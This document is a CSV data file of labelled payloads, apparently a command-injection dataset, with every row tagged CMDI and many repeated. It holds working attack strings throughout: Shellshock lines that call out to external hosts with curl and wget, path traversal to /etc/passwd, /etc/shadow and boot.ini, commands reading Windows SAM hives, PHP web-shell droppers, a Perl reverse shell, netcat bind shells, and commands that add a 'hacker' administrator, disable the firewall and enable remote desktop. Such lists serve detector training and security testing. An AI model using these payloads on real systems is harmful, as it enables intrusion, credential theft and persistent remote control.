payload,attack
"() { :;}; /bin/bash -c \""wget http://a.b.c.d/bash-count.txt\""",CMDI
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
() { :;}; echo vulnerable 10,CMDI
() { :;}; echo vulnerable 10,CMDI
() { :;}; echo vulnerable 10,CMDI
() { :;}; echo vulnerable 10,CMDI
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
() { 0; }; touch /tmp/blns.shellshock1.fail;,CMDI
"() {<svg onload=""alert(1)""> {')' ""(</svg>"" {& }; echo -e ""header\x3axss",CMDI
"{{ get_user_file(""/etc/hosts"") }}",CMDI
"{{ get_user_file(""/etc/hosts"") }}",CMDI
"{{ get_user_file(""/etc/hosts"") }}",CMDI
"{{ get_user_file(""/etc/hosts"") }}",CMDI
"{{ get_user_file(""/etc/passwd"") }}",CMDI
"{{ get_user_file(""/etc/passwd"") }}",CMDI
"{{ get_user_file(""/etc/passwd"") }}",CMDI
"{{ get_user_file(""/etc/passwd"") }}",CMDI
"{{ get_user_file(""C:\boot.ini"") }}",CMDI
"{{ get_user_file(""C:\boot.ini"") }}",CMDI
"{{ get_user_file(""C:\boot.ini"") }}",CMDI
"{{ get_user_file(""C:\boot.ini"") }}",CMDI
{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
{{4+4}},CMDI
{{4+4}},CMDI
{{4+4}},CMDI
{{4+4}},CMDI
{{4+8}},CMDI
{{4+8}},CMDI
{{4+8}},CMDI
{{4+8}},CMDI
{{person.name}},CMDI
{{person.name}},CMDI
{{person.name}},CMDI
{{person.name}},CMDI
{{person.secret}},CMDI
{{person.secret}},CMDI
{{person.secret}},CMDI
{{person.secret}},CMDI
"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
{${phpinfo()}},CMDI
{${phpinfo()}},CMDI
{${phpinfo()}},CMDI
{${phpinfo()}},CMDI
{${sleep(10)}},CMDI
{${sleep(10)}},CMDI
{${sleep(10)}},CMDI
{${sleep(10)}},CMDI
{${sleep(20)}},CMDI
{${sleep(20)}},CMDI
{${sleep(20)}},CMDI
{${sleep(20)}},CMDI
{${sleep(20)}},CMDI
{${sleep(20)}},CMDI
{${sleep(3)}},CMDI
{${sleep(3)}},CMDI
{${sleep(3)}},CMDI
{${sleep(3)}},CMDI
{${sleep(3)}},CMDI
{${sleep(3)}},CMDI
{${sleep(hexdec(dechex(20)))}},CMDI
{${sleep(hexdec(dechex(20)))}},CMDI
{${sleep(hexdec(dechex(20)))}},CMDI
{${sleep(hexdec(dechex(20)))}},CMDI
{${sleep(hexdec(dechex(20)))}} ,CMDI
{${sleep(hexdec(dechex(20)))}} ,CMDI
{1} + {1},CMDI
{1} + {1},CMDI
{1} + {1},CMDI
{1} + {1},CMDI
{cmd},CMDI
{cmd}',CMDI
"@{[system ""touch /tmp/blns.fail""]}",CMDI
*; ls -lhtR /var/www/,CMDI
*; ls -lhtR /var/www/,CMDI
*; ls -lhtR /var/www/,CMDI
*; ls -lhtR /var/www/,CMDI
/.........................../../../../file',CMDI
/...........................\\..\\..\\..\\file',CMDI
/.../.../.../.../.../,CMDI
/.../.../.../.../.../file',CMDI
/../../../../../../../../../../../boot.ini,CMDI
/../../../../../../../../../../../boot.ini%00,CMDI
/../../../../../../../../../../../boot.ini%00.html,CMDI
/../../../../../../../../../../../boot.ini%00.jpg,CMDI
/../../../../../../../../../../../etc/passwd%00.html,CMDI
/../../../../../../../../../../../etc/passwd%00.jpg,CMDI
/../../../../../../../../../../etc/passwd,CMDI
/../../../../../../../../../../etc/passwd^^,CMDI
/../../../../../../../../../../etc/shadow,CMDI
/../../../../../../../../../../etc/shadow^^,CMDI
/../../../../../../../../%2A,CMDI
/../../../../../../../../bin/id|,CMDI
/../..//../..//file',CMDI
/..//..//..//..//file',CMDI
/..///..///..///..///file',CMDI
/../etc/./passwd',CMDI
/../etc/./passwd%00',CMDI
/..\../..\../..\../..\../..\../..\../boot.ini,CMDI
/..\../..\../..\../..\../..\../..\../etc/passwd,CMDI
/..\../..\../..\../..\../..\../..\../etc/shadow,CMDI
/..\\/..\\/..\\/..\\/..\\/..\\/..\\/file',CMDI
/..\\/..\\file.txt',CMDI
/..\\\\..\\\\..\\\\..\\\\file',CMDI
/..\\\\\\..\\\\\\..\\\\\\file',CMDI
/..%%32%66..%%32%66..%%32%66file.ini',CMDI
/..%%35%63..%%35%63file',CMDI
/..%252f..%252F..%252fetc/mtc',CMDI
/..%255c..%255c..%255cboot.ini',CMDI
/..%25c0%25af..%25c0%25affile',CMDI
/..%2E/..%2E/..%2E/..%2E/..%2E/file',CMDI
/..%2F..%2F..%2F..%2Fetc/mtc',CMDI
/..%5c..%5C..%5Cfile',CMDI
/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/dir%5C/file',CMDI
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,CMDI
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,CMDI
/..%c1%9c..%c1%9c\\file',CMDI
/./.././.././../file',CMDI
/././././././././././././file',CMDI
/./././././././././././boot.ini,CMDI
/./././././././././././etc/passwd,CMDI
/./././././././././././etc/shadow,CMDI
/.//..//.//..//.//..//file',CMDI
/.//././/././/./boot.ini',CMDI
/./\\/././\\/./file',CMDI
/.\\..\\.\\..\\.\\..\\file',CMDI
/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,CMDI
/.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\file',CMDI
/.\\/\\.\\.\\/\\.\\file',CMDI
/.\\\\..\\\\.\\\\..\\\\.\\..\\\\file',CMDI
/%%32%65%%32%65\\%%32%65%%32%65\\file',CMDI
/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66file.ini',CMDI
/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63file',CMDI
/%%32e%%32e%%32f%%32e%%32e%%32f%%32e%%32e%%32ffile',CMDI
/%2%65%2%65%2%66%2%65%2%65%2%66%2%65%2%65%2%66file',CMDI
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,CMDI
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,CMDI
/%252E%252E/%252E%252E/%252E%252E/etc/mtc',CMDI
/%252E%252E\\%252E%252E\\%252E%252E\\file',CMDI
/%252E%252E%252f%252E%252E%252f%252E%252E%252ffile',CMDI
/%252E%252E%255c%252E%252E%255c%252E%252E%255cfile.ini',CMDI
/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/file',CMDI
/%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\file',CMDI
/%25c0%25ae%25c0%25ae%25c0%25affile',CMDI
/%25c0%25ae%25c0%25ae%c1%9c%25c0%25ae%25c0%25ae%c1%9cfile',CMDI
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,CMDI
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,CMDI
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,CMDI
/%2E%2E/%2E%2E/%2E%2E/etc/mtc',CMDI
/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fmtc',CMDI
/%2e%2e%5c%2e%2e%5c%2e%2e%5cfile',CMDI
/%c0%ae/WEB-INF/web.xml',CMDI
/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/file',CMDI
/%c0%ae%c0%ae\\%c0%ae%c0%ae\\file',CMDI
/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%affile',CMDI
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cfile',CMDI
/%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002ffile',CMDI
/dev/null; touch /tmp/blns.fail ; echo,CMDI
/etc/hosts///////////',CMDI
/etc/passwd/./././././.',CMDI
/index.html|id|,CMDI
/index.html|id|,CMDI
/index.html|id|,CMDI
/index.html|id|,CMDI
/index.html|id|,CMDI
/index.html|id|,CMDI
/index.html|id|,CMDI
/index.html|id|,CMDI
/showcode.php/C:Windows/aaa.txt',CMDI
/webapp/WEB-INF./web.xml',CMDI
\..\..\..\..\..\..\..\..\..\..\boot.ini,CMDI
\..\..\..\..\..\..\..\..\..\..\etc\passwd,CMDI
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,CMDI
\..\..\..\..\..\..\..\..\..\..\etc\shadow,CMDI
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,CMDI
\\../\\../\\../file',CMDI
\\..\\..\\..\\..\\file',CMDI
\\&apos;/bin/cat%20/etc/passwd\\&apos;,CMDI
\\&apos;/bin/cat%20/etc/shadow\\&apos;,CMDI
\n{cmd},CMDI
\n{cmd}\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n,CMDI
\n/bin/ls -al\n',CMDI
\n/usr/bin/id;,CMDI
\n/usr/bin/id;,CMDI
\n/usr/bin/id;,CMDI
\n/usr/bin/id;,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id\n,CMDI
\n/usr/bin/id|,CMDI
\n/usr/bin/id|,CMDI
\n/usr/bin/id|,CMDI
\n/usr/bin/id|,CMDI
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
\nid;,CMDI
\nid;,CMDI
\nid;,CMDI
\nid;,CMDI
\nid;,CMDI
\nid;,CMDI
\nid;,CMDI
\nid;,CMDI
\nid\n,CMDI
\nid\n,CMDI
\nid\n,CMDI
\nid\n,CMDI
\nid\n,CMDI
\nid\n,CMDI
\nid\n,CMDI
\nid\n,CMDI
\nid|,CMDI
\nid|,CMDI
\nid|,CMDI
\nid|,CMDI
\nid|,CMDI
\nid|,CMDI
\nid|,CMDI
\nid|,CMDI
\r,CMDI
\r,CMDI
\r,CMDI
\r,CMDI
\r\n,CMDI
\r\n,CMDI
\r\n,CMDI
\r\n,CMDI
& ,CMDI
& ,CMDI
& ,CMDI
& curl http://crowdshield.com/.testing/rce.txt,CMDI
& curl http://crowdshield.com/.testing/rce.txt,CMDI
& curl http://crowdshield.com/.testing/rce.txt,CMDI
& curl http://crowdshield.com/.testing/rce.txt,CMDI
& dir,CMDI
& dir,CMDI
& dir,CMDI
& dir,CMDI
& dir C:\,CMDI
& dir C:\,CMDI
& dir C:\,CMDI
& dir C:\,CMDI
& dir C:\Documents and Settings\*,CMDI
& dir C:\Documents and Settings\*,CMDI
& dir C:\Documents and Settings\*,CMDI
& dir C:\Documents and Settings\*,CMDI
& dir C:\Users,CMDI
& dir C:\Users,CMDI
& dir C:\Users,CMDI
& dir C:\Users,CMDI
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
& id,CMDI
& id,CMDI
& id,CMDI
& id,CMDI
& id,CMDI
& id,CMDI
& id,CMDI
& id,CMDI
& ifconfig,CMDI
& ifconfig,CMDI
& ifconfig,CMDI
& ifconfig,CMDI
& ipconfig /all,CMDI
& ipconfig /all,CMDI
& ipconfig /all,CMDI
& ipconfig /all,CMDI
& ls -l /,CMDI
& ls -l /,CMDI
& ls -l /,CMDI
& ls -l /,CMDI
& ls -l /etc/,CMDI
& ls -l /etc/,CMDI
& ls -l /etc/,CMDI
& ls -l /etc/,CMDI
& ls -l /home/*,CMDI
& ls -l /home/*,CMDI
& ls -l /home/*,CMDI
& ls -l /home/*,CMDI
& ls -l /tmp,CMDI
& ls -l /tmp,CMDI
& ls -l /tmp,CMDI
& ls -l /tmp,CMDI
& ls -l /var/www/*,CMDI
& ls -l /var/www/*,CMDI
& ls -l /var/www/*,CMDI
& ls -l /var/www/*,CMDI
& ls -laR /etc,CMDI
& ls -laR /etc,CMDI
& ls -laR /etc,CMDI
& ls -laR /etc,CMDI
& ls -laR /var/www,CMDI
& ls -laR /var/www,CMDI
& ls -laR /var/www,CMDI
& ls -laR /var/www,CMDI
& nc -lvvp 4444 -e /bin/sh&,CMDI
& nc -lvvp 4444 -e /bin/sh&,CMDI
& nc -lvvp 4444 -e /bin/sh&,CMDI
& nc -lvvp 4444 -e /bin/sh&,CMDI
& net localgroup Administrators hacker /ADD,CMDI
& net localgroup Administrators hacker /ADD,CMDI
& net localgroup Administrators hacker /ADD,CMDI
& net localgroup Administrators hacker /ADD,CMDI
& net user hacker Password1 /ADD,CMDI
& net user hacker Password1 /ADD,CMDI
& net user hacker Password1 /ADD,CMDI
& net user hacker Password1 /ADD,CMDI
& net view,CMDI
& net view,CMDI
& net view,CMDI
& net view,CMDI
& netsh firewall set opmode disable,CMDI
& netsh firewall set opmode disable,CMDI
& netsh firewall set opmode disable,CMDI
& netsh firewall set opmode disable,CMDI
& netstat -an,CMDI
& netstat -an,CMDI
& netstat -an,CMDI
& netstat -an,CMDI
"& perl -e 'print ""X""x16096'",CMDI
"& perl -e 'print ""X""x16096'",CMDI
"& perl -e 'print ""X""x16096'",CMDI
"& perl -e 'print ""X""x16096'",CMDI
"& perl -e 'print ""X""x2048'",CMDI
"& perl -e 'print ""X""x2048'",CMDI
"& perl -e 'print ""X""x2048'",CMDI
"& perl -e 'print ""X""x2048'",CMDI
"& perl -e 'print ""X""x4096'",CMDI
"& perl -e 'print ""X""x4096'",CMDI
"& perl -e 'print ""X""x4096'",CMDI
"& perl -e 'print ""X""x4096'",CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &,CMDI
& ping -i 30 127.0.0.1 &',CMDI
& ping -n 30 127.0.0.1 &,CMDI
& ping -n 30 127.0.0.1 &,CMDI
& ping -n 30 127.0.0.1 &,CMDI
& ping -n 30 127.0.0.1 &,CMDI
& ping -n 30 127.0.0.1 &,CMDI
& ping -n 30 127.0.0.1 &,CMDI
& ping -n 30 127.0.0.1 &,CMDI
& ping -n 30 127.0.0.1 &,CMDI
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
& system('sleep 5');,CMDI
& system('sleep 5');,CMDI
& system('sleep 5');,CMDI
& system('sleep 5');,CMDI
& type %SYSTEMROOT%\repair\SAM,CMDI
& type %SYSTEMROOT%\repair\SAM,CMDI
& type %SYSTEMROOT%\repair\SAM,CMDI
& type %SYSTEMROOT%\repair\SAM,CMDI
& type %SYSTEMROOT%\repair\SYSTEM,CMDI
& type %SYSTEMROOT%\repair\SYSTEM,CMDI
& type %SYSTEMROOT%\repair\SYSTEM,CMDI
& type %SYSTEMROOT%\repair\SYSTEM,CMDI
& type C:\Windows\repair\SAM,CMDI
& type C:\Windows\repair\SAM,CMDI
& type C:\Windows\repair\SAM,CMDI
& type C:\Windows\repair\SAM,CMDI
& type C:\Windows\repair\SYSTEM,CMDI
& type C:\Windows\repair\SYSTEM,CMDI
& type C:\Windows\repair\SYSTEM,CMDI
& type C:\Windows\repair\SYSTEM,CMDI
& type C:\WINNT\repair\SAM,CMDI
& type C:\WINNT\repair\SAM,CMDI
& type C:\WINNT\repair\SAM,CMDI
& type C:\WINNT\repair\SAM,CMDI
& uname -a,CMDI
& uname -a,CMDI
& uname -a,CMDI
& uname -a,CMDI
& wget http://crowdshield.com/.testing/rce.txt,CMDI
& wget http://crowdshield.com/.testing/rce.txt,CMDI
& wget http://crowdshield.com/.testing/rce.txt,CMDI
& wget http://crowdshield.com/.testing/rce.txt,CMDI
& whoami,CMDI
& whoami,CMDI
& whoami,CMDI
& whoami,CMDI
&{cmd},CMDI
&{cmd}&,CMDI
&& ,CMDI
&& ,CMDI
&& ,CMDI
&& ,CMDI
&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& dir C:\,CMDI
&& dir C:\,CMDI
&& dir C:\,CMDI
&& dir C:\,CMDI
&& dir C:\Documents and Settings\*,CMDI
&& dir C:\Documents and Settings\*,CMDI
&& dir C:\Documents and Settings\*,CMDI
&& dir C:\Documents and Settings\*,CMDI
&& dir C:\Users,CMDI
&& dir C:\Users,CMDI
&& dir C:\Users,CMDI
&& dir C:\Users,CMDI
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
&& ifconfig,CMDI
&& ifconfig,CMDI
&& ifconfig,CMDI
&& ifconfig,CMDI
&& ipconfig /all,CMDI
&& ipconfig /all,CMDI
&& ipconfig /all,CMDI
&& ipconfig /all,CMDI
&& ls -l /,CMDI
&& ls -l /,CMDI
&& ls -l /,CMDI
&& ls -l /,CMDI
&& ls -l /etc/,CMDI
&& ls -l /etc/,CMDI
&& ls -l /etc/,CMDI
&& ls -l /etc/,CMDI
&& ls -l /home/*,CMDI
&& ls -l /home/*,CMDI
&& ls -l /home/*,CMDI
&& ls -l /home/*,CMDI
&& ls -l /tmp,CMDI
&& ls -l /tmp,CMDI
&& ls -l /tmp,CMDI
&& ls -l /tmp,CMDI
&& ls -l /var/www/*,CMDI
&& ls -l /var/www/*,CMDI
&& ls -l /var/www/*,CMDI
&& ls -l /var/www/*,CMDI
&& ls -laR /etc,CMDI
&& ls -laR /etc,CMDI
&& ls -laR /etc,CMDI
&& ls -laR /etc,CMDI
&& ls -laR /var/www,CMDI
&& ls -laR /var/www,CMDI
&& ls -laR /var/www,CMDI
&& ls -laR /var/www,CMDI
&& nc -lvvp 4444 -e /bin/sh &,CMDI
&& nc -lvvp 4444 -e /bin/sh &,CMDI
&& nc -lvvp 4444 -e /bin/sh &,CMDI
&& nc -lvvp 4444 -e /bin/sh &,CMDI
&& net localgroup Administrators hacker /ADD,CMDI
&& net localgroup Administrators hacker /ADD,CMDI
&& net localgroup Administrators hacker /ADD,CMDI
&& net localgroup Administrators hacker /ADD,CMDI
&& net user hacker Password1 /ADD,CMDI
